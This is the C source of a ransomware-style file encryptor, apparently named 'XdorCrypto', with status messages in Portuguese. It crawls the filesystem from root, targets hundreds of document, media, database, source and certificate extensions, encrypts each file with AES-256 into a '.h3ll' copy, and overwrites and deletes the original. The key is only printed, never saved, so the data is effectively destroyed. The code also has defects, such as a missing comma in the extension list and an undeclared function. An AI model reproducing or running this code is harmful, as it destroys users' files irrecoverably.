#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

struct filez {
    const unsigned char *buffer;
    size_t size;
    unsigned char iv[AES_BLOCK_SIZE];
};
typedef struct filez Filez;

int readFile(const char *);
void writeFile(const char *, const unsigned char *, size_t);
void encryptFile(const char *);
int listFiles(const char *, const struct stat *, int);
int checkExtension(const char *);

Filez file;

const char *allowedExtensions[] = {
    ".doc", ".rtf", ".md", ".wpd", ".ppt", ".pps", ".odp", ".key", ".ods",
    ".xlr", ".xls", ".txt", ".pdf", ".zip", ".jpeg", ".jpg", ".png", ".gif", ".bmp",
    ".psd", ".ico", ".svg", ".tif", ".mp3", ".flac", ".aif", ".wav", ".wma", ".ogg",
    ".mpa", ".cda", ".mp4", ".wmv", ".mpg", ".mpeg", ".m4v", ".h264", ".mkv", ".3g2",
    ".3gp", ".avi", ".mov", ".flv", ".7z", ".tar", ".rar", ".gz", ".db", ".dbf", ".db3",
    ".docx", ".xlsx", ".pptx", ".csv", ".sql",  ".php", ".asp",
    ".yml", ".aspx", ".jsp", ".css", ".html", ".json",
    ".xml", ".bz2", ".bak", ".sqlitedb", ".sqlite", ".java", ".class", ".jar",
    ".aac", ".aiff", ".ape", ".swf", ".tex", ".epub", ".iso",
    ".htm",  ".cpp", ".cxx", ".h", ".hpp", ".hxx", ".xhtml",
    ".awk", ".cgi", ".pl", ".ada", ".swift", ".ps", ".der",  ".pe", ".cr",
    ".go", ".py", ".bf", ".coffee", ".cdr", ".jfif"
    ".sh", ".rb", ".brd", ".sch", ".dch", ".dip", ".vb", ".vbs", ".ps1", ".bat", ".cmd",
    ".js", ".asm", ".h", ".pas", ".c", ".cs", ".suo", ".sln", ".ldf", ".mdf", ".ibd",
    ".myi", ".myd", ".frm", ".odb",  ".db", ".mdb", ".accdb", ".sqlite3",
    ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp",
    ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots",".3dm", ".max", ".3ds",
    ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".pfx",
    ".pst", ".ost", ".msg", ".eml", ".vsd", ".vsdx", ".wks", ".wk1", ".dwg", ".onetoc2",
    ".snt", ".docb", ".docm", ".dot", ".dotm", ".dotx", ".xlsm", ".xlsb", ".xlw", ".xlt",
    ".xlm", ".xlc", ".xltx", ".xltm", ".pptm", ".pot", ".ppsm", ".ppsx", ".ppam", ".potx",
    ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".vmdk", ".vmx",
     ".gpg", ".aes", ".arc", ".paq", ".tbk", ".tgz", ".backup", ".vcd", ".raw", ".cgm", ".tiff",
     ".nef", ".ai", ".djvu", ".m4u", ".m3u", ".mid", ".asf", ".vob", ".fla", ".sh"
};

unsigned char encryptionKey[65]; 

void generateRandomKey(unsigned char *key, int size) {
    RAND_bytes(key, size);
}


void printHex(const unsigned char *buffer, size_t size) {
    for (size_t i = 0; i < size; ++i) {
        printf("%02X", buffer[i]);
    }
    printf("\n");
}

int main(int argc, const char *argv[]) {
    generateRandomKey(encryptionKey, 64);

    const char *path;
    if (argc == 1) {
        path = "/";
    } else if (argc == 2) {
        path = argv[1];
    } else {
        printf("Modo de uso: %s <diretorio>\n", argv[0]);
        return 1;
    }
    // animação
    printf("[STATUS] Iniciando XdorCrypto.\n");sleep(1);printf("[STATUS] Carregando dependencias.\n");sleep(1);
    printf("[STATUS] Gerando keys \n\n");printf("");
    int duration_ms = 5000 ; int steps = 28; spinAnimation(duration_ms, steps);
    printf("Chave AES-Hexa : ");printHex(encryptionKey, 32);sleep(1);
    printf("Localizando arquivos do alvo.\n\n");
    DIR *dir;
    struct dirent *entry;
    dir = opendir(path);
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            printf("Diretorio /%s\n", entry->d_name);
            usleep(600000);
        }
    }
    closedir(dir);

    ftw(path, listFiles, 1);
    return 0;
}

void spinAnimation(int duration_ms, int steps) {
    char h[] = "|/-\\";
    int delay = duration_ms * 2000 / steps;
    for (int i = 0; i < steps; i++) {
        printf("\r%c", h[i % 4]);
        fflush(stdout);
        usleep(delay);
    }
    printf("\r");
}

void secureDeleteFile(const char *filename) {
    FILE *file = fopen(filename, "rb+");
    if (file == NULL) {
        printf("Erro ao abrir o arquivo.\n");
        return;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    char zero = 0;
    for (long i = 0; i < fileSize; ++i) {
        fwrite(&zero, 1, 1, file);
    }
    fclose(file);
    remove(filename);
}

void encryptFile(const char *filename) {
    if (readFile(filename) != 0) {
        printf("Erro ao ler o arquivo: %s\n", filename);
        return;
    }

    unsigned char encryptedBuffer[file.size];
    AES_KEY encKey;
    AES_set_encrypt_key(encryptionKey, 256, &encKey);
    AES_cbc_encrypt(file.buffer, encryptedBuffer, file.size, &encKey, file.iv, AES_ENCRYPT);

    char encryptedFilename[256];
    snprintf(encryptedFilename, sizeof(encryptedFilename), "%s.h3ll", filename);
    writeFile(encryptedFilename, encryptedBuffer, file.size);

    secureDeleteFile(filename);
    free((void *)file.buffer);
}

int listFiles(const char *name, const struct stat *status, int type) {
    if (type == FTW_NS)
        return 0;

    if (type == FTW_F) {
        if (strstr(name, "/.") == NULL) {
            if (checkExtension(name) == 0) {
                encryptFile(name);
            }
        }
    }

    return 0;
}

int checkExtension(const char *name) {
    int numExtensions = sizeof(allowedExtensions) / sizeof(allowedExtensions[0]);
    for (int i = 0; i < numExtensions; i++) {
        if (strcasestr(name, allowedExtensions[i]) != NULL) {
            return 0;
        }
    }
    return 1;
}

void writeFile(const char *name, const unsigned char *content, size_t size) {
    FILE *fp = fopen(name, "wb");
    if (fp == NULL) {
        return;
    }
    fwrite(content, 1, size, fp);
    fclose(fp);
}

int readFile(const char *name) {
    FILE *fp = fopen(name, "rb");
    if (fp == NULL) {
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    file.size = ftell(fp);
    rewind(fp);
    file.buffer = (const unsigned char *)malloc(file.size * sizeof(unsigned char));
    fread((unsigned char *)file.buffer, 1, file.size, fp);
    fclose(fp);
    return 0;
}
